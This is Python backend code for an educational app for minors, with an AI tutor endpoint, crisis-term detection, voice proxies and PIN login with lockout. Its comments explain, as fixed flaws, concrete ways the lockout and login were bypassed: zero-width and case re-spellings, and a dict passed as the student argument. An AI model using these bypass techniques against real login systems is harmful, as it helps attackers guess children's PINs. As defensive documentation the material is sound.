_RE_AADHAAR = re.compile(r"\b\d{4}\s?\d{4}\s?\d{4}\b")
_RE_PHONE = re.compile(r"\b\d{10}\b")
_RE_URL = re.compile(r"https?://\S+")

# Deterministic crisis lexicon — runs BEFORE the model so a disclosure never reaches an
# open-ended generator and always yields the safe escalation path. Crude on purpose
# (high recall, accepts false positives); the always-on "Tell the teacher" button and a
# facilitator review of every flagged row are the real safety net, not this list.
_CRISIS_TERMS = (
    "suicide", "kill myself", "kill me", "end my life", "self harm", "khudkushi",
    "atmahatya", "marna chahti", "marna chahta", "jaan dena", "jaan de",
    "rape", "molest", "abuse", "beating me", "hits me", "marta hai", "marti hai",
    "chhua", "galat kaam", "gande", "blood",
    "आत्महत्या", "मरना चाहती", "मरना चाहता", "जान दे", "जान देना",
    "छेड़", "पीटता", "पीटती", "गंदा", "गंदी", "मारता", "मारती",
)


# (There used to be a second limiter, _rate_ok_strict, that duplicated _rate_ok with the
# opposite failure mode — and drifted from it, inheriting the same spoofable key and the
# same never-closing window. It is now _rate_ok(..., fail_closed=True): ONE implementation,
# with the open/closed choice stated at each call site.)


def _redact(text):
    """Scrub structured PII. Returns (clean_text, was_redacted). Best-effort only."""
    if not text:
        return "", False
    out = _RE_EMAIL.sub("[email]", text)
    out = _RE_AADHAAR.sub("[number]", out)
    out = _RE_PHONE.sub("[number]", out)
    return out, (out != text)


def _is_crisis(text):
    t = (text or "").lower()
    return any(term in t for term in _CRISIS_TERMS)


def _filter_output(text):
    """Last gate on what gets spoken to / stored for a child: strip URLs, emails and bare
    digit strings (phone/Aadhaar) from the model's reply. Best-effort, same as _redact."""
    out = _RE_URL.sub("", text or "")
    out = _RE_EMAIL.sub("", out)
    out = _RE_AADHAAR.sub("", out)
    out = _RE_PHONE.sub("", out)
    return out.strip()


def _log_ai_turn(student, sinfo, ctx, conversation_id, client_turn_id, prompt, reply,
                 model, was_canned, flagged, flag_reason, redacted, latency_ms):
    """Upsert the parent AI Conversation (by conversation_id) and insert one Turn.
    Best-effort — a logging failure must never break the child's answer."""
    try:
        conv = None
        if conversation_id:
            conv = frappe.db.get_value("AI Conversation", {"conversation_id": conversation_id}, "name")
        if conv:
            if flagged:
                frappe.db.set_value("AI Conversation", conv, {
                    "flagged": 1, "flag_reason": (flag_reason or "")[:140],
                    "escalated": 1 if flag_reason == "crisis" else 0,
                }, update_modified=False)
        else:
            try:
                conv = frappe.get_doc({
                    "doctype": "AI Conversation",
                    "conversation_id": conversation_id or frappe.generate_hash(length=24),
                    "student": student, "student_name": sinfo.get("student_name"),
                    "cohort": sinfo.get("cohort"),
                    "track": ctx["track"], "lesson": ctx["lesson"], "activity": ctx["activity"],
                    "lang": ctx["lang"], "model": (model or "")[:140],
                    "flagged": flagged, "flag_reason": (flag_reason or "")[:140],
                    "escalated": 1 if flag_reason == "crisis" else 0,
                    "started_on": frappe.utils.now(),
                }).insert(ignore_permissions=True).name
            except frappe.DuplicateEntryError:                # raced with another turn of the same convo
                frappe.db.rollback()
                conv = (frappe.db.get_value("AI Conversation", {"conversation_id": conversation_id}, "name")
                        if conversation_id else None)

        if not conv:   # degraded path — the turn would be an orphan, invisible to the review queue
            frappe.log_error("hikmat: AI turn has no parent conversation (orphan); flagged=" + str(flagged),
                             "hikmat ai_ask")

        if client_turn_id and frappe.db.get_value("AI Conversation Turn", {"client_turn_id": client_turn_id}, "name"):
            return conv                                       # idempotent: this turn already logged
        try:
            frappe.get_doc({
                "doctype": "AI Conversation Turn", "conversation": conv,
                "student": student, "cohort": sinfo.get("cohort"),
                "track": ctx["track"], "lesson": ctx["lesson"], "activity": ctx["activity"],
                # the child's doubt AND the model's reply are read by a facilitator in Desk; the
                # reply is generator output, i.e. steerable by the prompt, so it is not trusted
                "prompt": _plain_text(prompt)[:2000], "reply": _plain_text(reply)[:2000],
                "lang": ctx["lang"], "model_version": (model or "")[:140],
                "prompt_version": _PROMPT_VERSION, "latency_ms": _int(latency_ms),
                "was_canned": 1 if was_canned else 0, "redaction_applied": 1 if redacted else 0,
                "flagged": 1 if flagged else 0, "client_turn_id": client_turn_id or None,
                "created_on": frappe.utils.now(),
            }).insert(ignore_permissions=True)
        except frappe.DuplicateEntryError:
            frappe.db.rollback()
        frappe.db.commit()
        return conv
    except Exception:
        frappe.log_error("hikmat: ai turn logging failed", frappe.get_traceback())
        return None


@frappe.whitelist(allow_guest=True)
def ai_ask(student=None, token=None, track=None, lesson=None, activity=None,
           prompt=None, lang=None, conversation_id=None, client_turn_id=None):
    """Forward a child's doubt to the local Ollama tutor and return Roshni's Hindi reply.
    Requires a logged-in, consented student (guest free-text can't be consented or erased,
    so no anonymous AI). Everything is attacker-controllable → fail-closed, redact, cap."""
    if not _rate_ok("ai:ip:" + _client_ip(), 120, 3600, fail_closed=True):   # per-IP hourly ceiling
        return {"ok": False, "error": "rate_limited"}
    if not student:
        return {"ok": False, "error": "login_required"}
    sinfo = frappe.db.get_value("Student", student, ["student_name", "cohort", "active"], as_dict=True)
    if not sinfo or not sinfo.active:
        return {"ok": False, "error": "unknown_student"}
    if not _token_ok(student, token):
        return {"ok": False, "error": "auth"}
    if not _rate_ok("ai:stu:" + str(student), 40, 3600, fail_closed=True):   # per-student hourly cap
        return {"ok": False, "error": "rate_limited"}

    s = frappe.get_single("Hikmat Settings")
    if not s.get("ai_enabled"):
        return {"ok": False, "error": "ai_off"}

    # Her typed doubt and the context keys are persisted on AI Conversation / …Turn and read by
    # a facilitator in Desk, so they get the same ingest treatment as report_doubt.question.
    msg = _plain_text(prompt)[:2000]
    if not msg:
        return {"ok": False, "error": "empty"}

    ctx = {"track": _content_key(track), "lesson": _content_key(lesson),
           "activity": _content_key(activity), "lang": _content_key(lang, 10)}
    model = (s.get("ai_model") or "gemma4:12b-mlx").strip()

    red_msg, redacted = _redact(msg)

    # Crisis short-circuit — never calls the model; serves a safe canned reply + flags
    # the conversation for facilitator review. (Real-time escalation to the named
    # Safeguarding Lead is the next step, pending that person being named.)
    if _is_crisis(red_msg):
        reply = (s.get("ai_crisis_reply") or _DEFAULT_CRISIS_REPLY)
        logged = _log_ai_turn(student, sinfo, ctx, conversation_id, client_turn_id, red_msg, reply,
                              model=model, was_canned=1, flagged=1, flag_reason="crisis",
                              redacted=redacted, latency_ms=0)
        if not logged:   # safeguarding path must never fail silently — leave a distinct trail
            frappe.log_error("hikmat: CRISIS disclosure flag may NOT have persisted — check this; student="
                             + str(student), "hikmat ai_ask CRISIS")
        return {"ok": True, "reply": reply, "flagged": True}

    sys_prompt = (s.get("ai_system_prompt") or _DEFAULT_AI_PROMPT)
    endpoint = (s.get("ai_endpoint") or "http://localhost:11434").rstrip("/")

    import time
    import requests                                           # lazy import — only when AI is used
    t0 = time.monotonic()
    try:
        r = requests.post(endpoint + "/api/chat", json={
            "model": model, "stream": False,
            "messages": [{"role": "system", "content": sys_prompt},
                         {"role": "user", "content": red_msg}],
            "options": {"temperature": 0.6, "num_ctx": 4096, "num_predict": 160, "repeat_penalty": 1.1},
            "keep_alive": "30m",
        }, timeout=45)   # first call cold-loads the 6.8GB model (~slow); keep_alive holds it warm after
        latency_ms = int((time.monotonic() - t0) * 1000)
    except Exception:                                         # Ollama down / timeout → scripted fallback
        return {"ok": False, "error": "ai_unavailable"}
    if not r.ok:
        return {"ok": False, "error": "ai_unavailable"}
    try:
        reply = ((r.json().get("message") or {}).get("content") or "").strip()
    except Exception:
        reply = ""
    reply = _filter_output(reply)[:1200]
    if not reply:
        return {"ok": False, "error": "ai_unavailable"}

    _log_ai_turn(student, sinfo, ctx, conversation_id, client_turn_id, red_msg, reply,
                 model=model, was_canned=0, flagged=0, flag_reason="", redacted=redacted,
                 latency_ms=latency_ms)
    return {"ok": True, "reply": reply}


# ---------------------------------------------------------------------------
# Roshni VOICE — local Whisper (STT) + Piper (TTS), proxied through Frappe so the browser
# uses ONE same-origin gateway (no CORS) and both model daemons stay bound to 127.0.0.1,
# unreachable from the school LAN. Audio is forwarded, NEVER persisted — only the transcript
# is logged later via ai_ask (text-only privacy posture). ANE is broken on M4+macOS26, so
# Whisper runs on Metal and shares the GPU with the tutor LLM → callers MUST single-flight
# STT→LLM→TTS (enforced client-side). Piper is CPU-only, so TTS can overlap the LLM.
# ---------------------------------------------------------------------------
@frappe.whitelist(allow_guest=True)
def ai_transcribe(student=None, token=None, lang="hi"):
    """Forward a short captured WAV to the local whisper-server; return the transcript only.
    Requires a logged-in, consented student (same gate as ai_ask). Stores no audio."""
    if not _rate_ok("stt:ip:" + _client_ip(), 240, 3600, fail_closed=True):
        return {"ok": False, "error": "rate_limited"}
    if not student:
        return {"ok": False, "error": "login_required"}
    sinfo = frappe.db.get_value("Student", student, ["active"], as_dict=True)
    if not sinfo or not sinfo.active:
        return {"ok": False, "error": "unknown_student"}
    if not _token_ok(student, token):
        return {"ok": False, "error": "auth"}
    if not _rate_ok("stt:stu:" + str(student), 80, 3600, fail_closed=True):
        return {"ok": False, "error": "rate_limited"}

    s = frappe.get_single("Hikmat Settings")
    if not s.get("voice_enabled"):
        return {"ok": False, "error": "voice_off"}
    f = frappe.request.files.get("audio") if getattr(frappe, "request", None) else None
    if not f:
        return {"ok": False, "error": "no_audio"}
    audio = f.read()
    if not audio or len(audio) > 4 * 1024 * 1024:   # ~4MB cap — a short push-to-talk clip
        return {"ok": False, "error": "bad_audio"}
    endpoint = (s.get("stt_endpoint") or "http://127.0.0.1:8080").rstrip("/")

    import requests
    try:
        r = requests.post(endpoint + "/inference",
                          files={"file": ("clip.wav", audio, "audio/wav")},
                          data={"language": (lang or "hi")[:5], "response_format": "json", "temperature": "0"},
                          timeout=20)
    except Exception:
        return {"ok": False, "error": "stt_unavailable"}
    if not r.ok:
        return {"ok": False, "error": "stt_unavailable"}
    try:
        text = (r.json().get("text") or "").strip()
    except Exception:
        text = (r.text or "").strip()
    return {"ok": True, "text": text[:2000]}


@frappe.whitelist(allow_guest=True)
def ai_tts(student=None, token=None, text=None):
    """Synthesize a short Hindi line via the local Piper server; return WAV bytes. The client
    caches by text so each phrase is synthesized once. Login required (v1 routes only Roshni's
    replies through neural TTS; general app narration stays on the browser voice). Piper's voice
    is fixed at server launch (see tts_voice / the setup script), so only text is sent."""
    if not _rate_ok("tts:ip:" + _client_ip(), 600, 3600, fail_closed=True):
        return {"ok": False, "error": "rate_limited"}
    if not student or not _token_ok(student, token):
        return {"ok": False, "error": "auth"}
    s = frappe.get_single("Hikmat Settings")
    if not s.get("voice_enabled"):
        return {"ok": False, "error": "voice_off"}
    msg = (text or "").strip()[:600]
    if not msg:
        return {"ok": False, "error": "empty"}
    endpoint = (s.get("tts_endpoint") or "http://127.0.0.1:5000").rstrip("/")

    import requests
    try:                                              # Piper http server: POST raw UTF-8 text → WAV
        r = requests.post(endpoint, data=msg.encode("utf-8"),
                          headers={"Content-Type": "text/plain; charset=utf-8"}, timeout=20)
    except Exception:
        return {"ok": False, "error": "tts_unavailable"}
    if not r.ok or not r.content:
        return {"ok": False, "error": "tts_unavailable"}
    frappe.response["type"] = "binary"
    frappe.response["filename"] = "roshni.wav"
    frappe.response["filecontent"] = r.content
    return


# ---------------------------------------------------------------------------
# Student login (facilitator-managed or self-signup; no email/password)
# ---------------------------------------------------------------------------
@frappe.whitelist(allow_guest=True)
def get_csrf():
    """The game is a static page, so it has no CSRF token — but when the browser
    carries a logged-in session (a facilitator with Desk open, or an online student
    after /api/method/login), Frappe REJECTS token-less POSTs (CSRFTokenError → 400).
    This GET hands the page its own session's token; same-origin policy keeps other
    sites from reading it. Guests get "" (their POSTs aren't CSRF-checked)."""
    if frappe.session and frappe.session.user and frappe.session.user != "Guest":
        return {"token": frappe.sessions.get_csrf_token()}
    return {"token": ""}


@frappe.whitelist()   # STAFF-ONLY — enforced by _require_staff(), not by the decorator
def get_cohorts():
    """Every batch + the CENTRE it runs in. Staff only: this was the index that made
    get_students' per-cohort limit meaningless (guest → get_cohorts → get_students per
    cohort = the whole programme's roster of minors), and the list of centres where girls
    are taught is itself safeguarding-sensitive in Champaran."""
    _require_staff()
    return frappe.get_all("Cohort", fields=["name", "cohort_name", "center"],
                          order_by="cohort_name asc")


@frappe.whitelist(allow_guest=True)
def has_students():
    """Lightweight boot check — does any roster exist? Returns a bool only, never names
    (so the public boot path doesn't enumerate minors)."""
    return {"any": bool(frappe.db.count("Student", {"active": 1}))}


@frappe.whitelist()   # STAFF-ONLY — enforced by _require_staff(), not by the decorator
def get_students(cohort=None):
    """Roster for ONE cohort: each active girl's first name + avatar. Never the PIN (only
    hasPin). Staff only.

    This was guest-facing until 2026-07-28, with a comment calling it a known-accepted
    exposure on the grounds that a campus laptop on a stale cached build would lose its
    login roster. That client does not exist: get_students / get_cohorts appear in NO
    caller anywhere — not index.html, not the two synced copies, not the Capacitor bundle
    (android-app/www + the merged release assets), not the .aab packet, not the Desk
    reports. It powered the OLD roster-picker login, which was replaced by typed name+PIN
    (login_by_name) for online learners and by the staff-gated get_campus_roster for
    campus devices. So there is nothing left to break, and the cost of leaving it open was
    that any anonymous caller could enumerate every minor in the programme by name.
    Deliberately NOT deleted: a facilitator tool may still want a roster read, and a gate
    that is present and greppable is easier to keep honest than a deleted endpoint someone
    re-adds without one."""
    _require_staff()
    if not cohort:
        return []
    rows = frappe.get_all("Student", filters={"active": 1, "cohort": cohort},
                          fields=["name", "student_name", "avatar", "login_pin"],
                          order_by="student_name asc")
    return [{"id": r.name, "name": r.student_name, "avatar": r.avatar or "🙂",
             "hasPin": bool(r.login_pin)} for r in rows]


# ---------------------------------------------------------------------------
# PIN LOCKOUT — brute-force protection for a 4-digit PIN.
#
# THE KEY IS THE WHOLE CONTROL. It must be something the attacker cannot vary while
# attacking the same girl, which means it must be PER-ACCOUNT, independent of network
# identity, AND CANONICAL IN EXACTLY THE WAY THE DATABASE'S OWN COMPARISON IS. Both halves
# have been broken here before, each time proven over HTTP in about a minute:
#   1. it used to include _client_ip() → 20 wrong PINs with 20 spoofed X-Forwarded-For
#      values never tripped the 8-try ceiling. (The IP was spoofable too — fixed separately
#      in _client_ip — but even a perfect IP is the wrong key: a phone tether changes it.)
#   2. it used to be BYTE-EXACT (sha256 of the typed name / the raw docname) while the DB
#      lookup that actually authenticates the girl is `utf8mb4_unicode_ci`. That collation
#      is case-insensitive AND gives every zero-weight character NO weight at all, so
#      RE-SPELLING the account name selected the same row under a DIFFERENT bucket, i.e. a
#      fresh 8-try + 50/day budget per spelling. Measured on this bench with WEIGHT_STRING()
#      — U+200B/200C/200D/200E/200F/2060/2061/2062/2063/FEFF/180E/202A–202E/034F all weigh
#      nothing, and so do the Devanagari marks U+0901/0902/0903/093C/0951–0954. Proven:
#      7 zero-width spellings x 7 wrong PINs = 49 guesses against ONE girl, never `locked`,
#      correct PIN still worked; and 12 case spellings of one docname = 84 guesses, never
#      `locked`, then login_student(DOCNAME.upper(), correct_pin) → {"ok": true}.
# The fix for (2) is _login_name_key / _login_id_account below: the bucket is keyed on the
# canonical account, and the row lookup is filtered on the SAME canonical value, so every
# spelling that can authenticate against a girl shares ONE budget by construction.
#
# WHAT "THE ACCOUNT" IS on each endpoint:
#   * login_student  → the Student docname AS THE DATABASE RESOLVED IT (not as the caller
#     spelled it). Unique, and an opaque hash (Student autoname is `hash`), so no PII.
#   * login_by_name  → the CANONICAL NAME she typed (_login_name_key). Names are NOT unique,
#     so this bucket is shared by every girl with that name. That is the honest key anyway:
#     the name is the only identifier the caller supplies, and it is exactly what an attacker
#     must hold fixed to attack one girl. The two endpoints therefore have separate budgets
#     (`id:` / `nm:`),
#     which is deliberate: coupling them would let an attacker who knows one girl's docname
#     lock every girl who shares her first name.
#   The name is HASHED into the bucket (not stored raw) for two reasons: a child's real name
#   should not sit in a Redis key that any ops shell or SLOWLOG can read, and it bounds the
#   key size so a flood of long invented names cannot bloat the cache.
#
# THE ABUSE TRADE-OFF, chosen deliberately: a per-account lockout means an attacker can
# deliberately lock a CHILD out of her own profile — a denial of service against a girl who
# did nothing wrong. That is the price of not letting her PIN be guessed, and it is priced
# down as far as it can be:
#   * generous budgets. 8 wrong PINs before a 5-minute cooldown (unchanged), and 50 wrong
#     PINs in 24h before the profile parks. A girl mistyping her own PIN two or three times
#     per session is nowhere near either number, and a SUCCESSFUL login clears both counters.
#   * the day budget is what actually kills brute force (50 guesses/day ≈ 200 days to cover
#     half a 4-digit space, versus ~2 days on the 5-minute counter alone) — and it is also
#     the DoS window, so it is bounded to 24h rather than indefinite.
#   * a facilitator can release it INSTANTLY: clear_login_lockout(student=…) / (name=…).
#   * a provisioned CAMPUS laptop never touches these endpoints at all — it verifies her PIN
#     on-device against the cached roster hash (pbkdf2Verify in index.html), so the girls
#     most likely to be targeted in a shared centre cannot be locked out of their lessons by
#     this at all. The lockout binds the online/typed-name path.
# Everything above degrades OPEN if Redis is unavailable (see _fail_count): a cache outage
# must not stop a girl logging in, and the PIN check itself still stands.
#
# The counters reuse the rate-limiter buckets (_rate_ok/_rate_state/_rate_reset) so there is
# ONE counting implementation in this file: atomic INCR, and a true fixed window that really
# closes instead of being re-armed by every new attempt.
# ---------------------------------------------------------------------------
_MAX_PIN_TRIES = 8              # wrong PINs before the short cooldown
_LOCKOUT_SECONDS = 300          # ...and how long that cooldown lasts
_MAX_PIN_TRIES_DAY = 50         # wrong PINs per account per day before the profile parks
_LOCKOUT_DAY_SECONDS = 86400
_MAX_PIN_FAILS_PER_IP = 600     # per-SOURCE spray ceiling; counts FAILED logins only, so a
_LOGIN_FAIL_IP_WINDOW = 3600    # room of girls logging in normally never touches it


def _login_name_key(val):
    """The CANONICAL form of a TYPED student name: one key for every spelling that is able to
    authenticate against the same row. This is the whole fix for the proven bypass in (2)
    above, and it is used for BOTH the lockout bucket and the SQL filter, so the two cannot
    drift apart again.

    What it does, and why each step:
      1. `_docname` — a whitelisted argument arrives as parsed JSON, so a dict/list/bool is
         REJECTED here rather than str()-ed into a junk key (and, historically, rather than
         reaching the ORM filter as an operator spec).
      2. the SIGNUP pipeline (`_display_name` = _plain_text + _no_formula_lead), so the key
         of a typed name is the key of the name signup would have STORED. This is also the
         fix for a lockout-OUT bug of the same family: signup collapses whitespace runs but
         login only end-stripped, so a girl who typed "Asha  Devi" at signup could never log
         in again. ONE normalisation on both sides fixes the bypass and that together.
      3. every Cf (format) character dropped — the zero-width joiners/marks, the BOM, the
         word joiner, the bidi controls. The DB cannot see these, so they must not be able to
         split a budget. Dropping ALL of Cf rather than only the zero-weight ones is
         deliberate: a key COARSER than the DB comparison can only merge spellings into one
         budget, never split one, and no invisible character belongs in a login key.
         (`_plain_text` deliberately KEEPS ZWJ/ZWNJ because they are real Devanagari spelling
         — that is right for text we store and replay, and wrong for a comparison key.)
      4. whitespace re-collapsed, because step 3 can leave two spaces adjacent.
      5. `casefold()`, because the comparison it guards is case-insensitive.
      6. NFC, chosen deliberately. The worry is that adding a normalisation MariaDB does not
         perform would put this key out of step with the SQL filter — but measured here,
         MariaDB gives the nukta U+093C zero weight, so it ALREADY treats 'ड़' spelled U+095C
         and spelled U+0921 U+093C as one string. NFC therefore cannot make this key finer
         than the SQL filter; all it does is unify two byte-spellings of the SAME character
         (and canonically reorder marks), which lets a girl log in from a device whose IME
         composes differently from the one she signed up on. NFKC is NOT used: it rewrites
         characters and would corrupt real names.

    What it deliberately does NOT fold: COMBINING MARKS. utf8mb4_unicode_ci compares at
    primary strength and gives U+0901 candrabindu, U+0902 anusvara, U+0903 visarga, U+093C
    nukta and U+0951–0954 zero weight, so to the DB 'अंजू' == 'अजू' == 'अजूं'. Folding those in
    would merge two DIFFERENT girls' names, which is precisely what must not happen to a
    Hindi roster. They are handled the other way round instead: the endpoint re-checks this
    key against every candidate row IN PYTHON (see _login_name_candidates), so a mark-only
    difference no longer authenticates at all. That removes it as a re-spelling axis AND
    closes a separate flaw proven over HTTP on the way in — Anju typing her own name 'अंजू'
    was logged in as a DIFFERENT girl, 'अजू', and handed that girl's token."""
    s = _display_name(_docname(val, 140), 140)   # scalars only, then exactly what signup stores
    s = "".join(ch for ch in s if unicodedata.category(ch) != "Cf")
    return unicodedata.normalize("NFC", " ".join(s.split()).casefold())


def _login_account_key(kind, value):
    """Bucket suffix for one account. `kind` is "id" (a Student docname) or "nm" (a typed
    name, hashed — see the note above).

    `value` MUST already be CANONICAL: the docname the DB resolved to (see
    _login_id_account) for "id", `_login_name_key(...)` for "nm". Passing the caller's own
    spelling here is the bypass this module has already been broken by twice."""
    value = str(value or "")
    if kind == "nm":
        value = hashlib.sha256(value.encode("utf-8")).hexdigest()[:20]
    return kind + ":" + value


def _login_id_account(student, canon=None):
    """The bucket for the `id` login form, keyed on the CANONICAL docname.

    `tabStudent.name` is utf8mb4_unicode_ci as well, so 'UCESG77D8G' and 'ucesg77d8g' select
    the SAME row — proven: 84 wrong PINs across 12 case spellings of one docname never
    tripped the 8-try ceiling, and login_student(docname.upper(), correct_pin) then returned
    ok. So the key has to be the name the DATABASE resolved to, never the one typed.

    `canon` is that resolved docname. When the row does NOT exist we still return a bucket
    (keyed on the canonicalised argument) rather than skipping the lockout, so an unknown id
    locks after the same 8 tries as a real one: an attacker must not be able to tell an
    invented Student id from a real one by watching whether a lockout ever appears. The
    unknown key is HASHED for the same two reasons a name is — an invented id is
    attacker-controlled text up to the Link width, and it must not bloat the cache keyspace
    — and prefixed "?" so an operator reading Redis can see it resolved to nobody."""
    if canon:
        return _login_account_key("id", canon)
    return _login_account_key(
        "id", "?" + hashlib.sha256(_login_name_key(student).encode("utf-8")).hexdigest()[:20])


def _login_buckets(account):
    """The two per-account failure buckets: (short cooldown, 24h budget)."""
    return ("loginfail:" + account, "loginfail-day:" + account)


def _fail_count(bucket):
    """Current count in a failure bucket, 0 if the limiter cannot be read. Fail-OPEN on an
    outage is the same availability call the rest of the app makes (see _rate_ok): a Redis
    hiccup must not lock a classroom out of its own profiles, and the PIN still has to match."""
    try:
        return _rate_state(bucket)[0]
    except Exception as e:
        _rl_warn(bucket, e, False)
        return 0


def _login_ip_bucket():
    """The per-SOURCE failure bucket, or None when there is no identifiable source.

    _client_ip() answers "unknown" outside a request (scheduler, `bench execute`, a
    facilitator script). Throttling that is meaningless — it is one bucket for every
    context at once — and it could let an offline bulk job refuse real logins, so those
    calls simply carry no source ceiling. The per-account budget still applies."""
    ip = _client_ip()
    return ("loginfail-ip:" + ip) if ip and ip != "unknown" else None


def _login_blocked(account):
    """True when this account has spent its wrong-PIN budget, or this SOURCE has sprayed too
    many failures. Checked before the PIN is verified, so a locked account costs no pbkdf2.

    The per-source half is a spray throttle, NOT the authoritative control (that is the
    account, which no attacker can vary). It is set generously — 600 failures/hour is ~2× the
    worst hour of a large centre where every girl mistypes several times — because a whole
    classroom shares one public IP, and a facilitator can clear it with
    clear_login_lockout(ip=…) if a shared address is ever caught in it."""
    short_b, day_b = _login_buckets(account)
    if _fail_count(short_b) >= _MAX_PIN_TRIES or _fail_count(day_b) >= _MAX_PIN_TRIES_DAY:
        return True
    ip_b = _login_ip_bucket()
    return bool(ip_b) and _fail_count(ip_b) >= _MAX_PIN_FAILS_PER_IP


def _login_failed(account):
    """Count one wrong PIN: against the account (both windows) and against the source IP.
    Only FAILURES are counted, so a legitimate login never consumes budget."""
    short_b, day_b = _login_buckets(account)
    _rate_ok(short_b, _MAX_PIN_TRIES, _LOCKOUT_SECONDS)
    _rate_ok(day_b, _MAX_PIN_TRIES_DAY, _LOCKOUT_DAY_SECONDS)
    ip_b = _login_ip_bucket()
    if ip_b:
        _rate_ok(ip_b, _MAX_PIN_FAILS_PER_IP, _LOGIN_FAIL_IP_WINDOW)


def _login_succeeded(account):
    """A correct PIN clears the account's budget — the girl who mistyped four times and then
    got it right starts clean, and an attacker gains nothing (they had to know the PIN)."""
    for b in _login_buckets(account):
        try:
            _rate_reset(b)
        except Exception as e:                 # a cache outage must not fail a good login
            _rl_warn(b, e, False)


@frappe.whitelist()   # STAFF-ONLY — enforced by _require_staff(), not by the decorator
def clear_login_lockout(student=None, name=None, ip=None, mobile=None):
    """Let a locked-out girl back in NOW. This is the release valve that makes a per-account
    lockout acceptable: without it, an attacker burning another child's wrong-PIN budget would
    keep her out for up to 24h with nobody able to help.

    Pass `student` (docname — clears her id buckets AND the name buckets for her
    student_name, because she may have been locked on either screen), `name` (the typed
    name — clears that name's buckets), and/or `ip` (the per-source spray counter, for the
    rare case a whole shared classroom IP is blocked). Reports the counts it found so a
    facilitator can tell a real lockout from a girl who is simply mistyping her PIN.

    BOTH forms go through the same canonicalisation the login endpoints use, so whatever
    spelling the facilitator happens to type releases the bucket that is actually held: the
    docname in any case, and a name with the wrong case, a stray zero-width character or a
    double space in it. A release valve that only worked for one spelling of the name would
    be no valve at all — it is what makes a per-account lockout tolerable."""
    _require_staff()
    student, name, ip = _docname(student), _docname(name), _norm_ip(ip)
    out_otp = {}
    if mobile:
        # The OTP arm, and it is the same release valve for the same reason. The send ceilings
        # are keyed on the guardian's NUMBER, which is not a secret, so anyone who knows it can
        # spend a family's daily sends and leave a girl unable to recover her PIN for 24 hours.
        # A per-number ceiling is only tolerable if somebody can lift it on the spot — exactly
        # the argument made for the PIN buckets above.
        e164 = _norm_mobile(mobile)
        if not e164:
            return {"ok": False, "error": "bad_mobile"}
        mh = _mobile_hash(e164)
        for b in ("otpdayall:" + mh, "otpreset:" + mh) + tuple(
                pre + p + ":" + mh for pre in ("otpday:", "otpcool:") for p in ("consent", "recovery")):
            out_otp[b] = {"count": _fail_count(b)}
            try:
                _rate_reset(b)
            except Exception as e:
                _rl_warn(b, e, False)
        # Challenges already burned to their attempt ceiling stay dead — they were guessed at,
        # and reviving one would hand the guesser more tries. She simply asks for a new code,
        # which the cleared budget now allows.
    targets = []
    if student:
        row = frappe.db.get_value("Student", student, ["name", "student_name"], as_dict=True)
        targets.append(_login_id_account(student, row.name if row else None))
        if row and row.student_name:
            targets.append(_login_account_key("nm", _login_name_key(row.student_name)))
    if name:
        key = _login_name_key(name)
        if key:                                  # a name of nothing but markup/format chars
            targets.append(_login_account_key("nm", key))
    targets = list(dict.fromkeys(targets))       # she may be reachable by both routes
    if not (targets or ip or out_otp):
        return {"ok": False, "error": "no_target"}
    out = {}
    for acct in targets:
        short_b, day_b = _login_buckets(acct)
        recent, today = _fail_count(short_b), _fail_count(day_b)
        # account-only verdict: _login_blocked() also consults the CALLER's source counter,
        # which would answer about the facilitator's own IP, not about this girl.
        out[acct] = {"recent_fails": recent, "fails_today": today,
                     "was_locked": recent >= _MAX_PIN_TRIES or today >= _MAX_PIN_TRIES_DAY}
        _login_succeeded(acct)
    if ip:
        b = "loginfail-ip:" + ip
        out[b] = {"fails_this_hour": _fail_count(b)}
        try:
            _rate_reset(b)
        except Exception as e:
            _rl_warn(b, e, False)
    out.update(out_otp)
    return {"ok": True, "cleared": out}


@frappe.whitelist(allow_guest=True)
def login_student(student, pin=None):
    """Verify a student's PIN with a per-account lockout (8 wrong tries → 5-min cooldown, and
    50/day → the profile parks; see the PIN LOCKOUT note above), defeating brute force of
    short numeric PINs. Constant-time compare.

    `student` MUST be coerced to a scalar document name (see _docname) before anything
    else. Without it this guest-facing endpoint was an ORM filter: the caller could name
    NO ONE — login_student({"login_pin": "1234"}) authenticated against whichever row the
    filter happened to select, returned that girl's name (attribute-enumeration of minors),
    and then rotated the token of EVERY matched row to one shared value via _token_for.
    The lockout was defeated at the same time, because its cache key was str(student):
    two spellings of one filter are two buckets, so the 8-try ceiling never closed.

    _docname is necessary but was NOT sufficient: `tabStudent.name` is utf8mb4_unicode_ci, so
    re-CASING a real docname still selected her row while keying a brand-new bucket (84
    guesses proven, then the correct PIN worked). The row is therefore resolved to its
    canonical name BEFORE the lockout is consulted, and everything downstream — the bucket,
    the PIN upgrade, the token, the id handed back to the device — uses that canonical name
    rather than the caller's spelling."""
    student = _docname(student)
    if not student:
        return {"ok": False, "error": "not_found"}      # same answer as a wrong id: no oracle
    # ONE indexed read, before the lockout check, purely to canonicalise the account. A
    # blocked account still costs no pbkdf2, which is what that ordering was protecting.
    s = frappe.db.get_value("Student", student,
                            ["name", "student_name", "login_pin", "active", "avatar", "band"],
                            as_dict=True)
    acct = _login_id_account(student, s.name if s else None)   # per-ACCOUNT, never per-IP
    if _login_blocked(acct):
        return {"ok": False, "error": "locked"}
    if not s or not s.active:
        # Counted, so an unknown id parks after the same 8 tries as a real one: the presence
        # or absence of a lockout must not answer "is this a real Student id?".
        _login_failed(acct)
        return {"ok": False, "error": "not_found"}
    student = s.name                                    # canonical from here on, never the typed spelling
    if not s.login_pin:                                 # PIN-less profile → un-loginnable; facilitator sets one in Desk
        return {"ok": False, "error": "no_pin"}         # not counted: there is no secret to guess
    if not _pin_ok(s.login_pin, pin):
        _login_failed(acct)
        return {"ok": False, "error": "wrong_pin"}
    _login_succeeded(acct)                              # reset the counters on success
    if not _looks_hashed(s.login_pin):                  # upgrade a legacy plaintext PIN to a hash on login
        frappe.db.set_value("Student", student, "login_pin", _hash_pin(str(s.login_pin)), update_modified=False)
    token = _token_for(student)
    frappe.db.commit()
    return {"ok": True, "id": student, "name": s.student_name, "avatar": s.avatar or "🙂", "token": token}


# The seven named guides the app offers (see MASCOTS in index.html). Whitelisted rather than
# stored free-form: this string is read back by the game and used to pick an SVG, and an
# unknown value there would silently fall back to Roshni anyway — better to reject it here so
# Desk and the app agree on what a guide is. Blank means Roshni.
MASCOT_IDS = ("roshni", "tara", "chanda", "zoya", "chotu", "kabir", "imran", "sheru", "bhalu")

# Student.gender is a Select with exactly these options.
GENDERS = ("Female", "Male", "Other")


def _validated_profile_fields(name, avatar, pin, age, band, gender=None, mascot=None):
    """Normalise and check every field a new learner profile needs. Returns
    (fields_for_insert, None) or (None, error_code). Touches the database only to confirm the
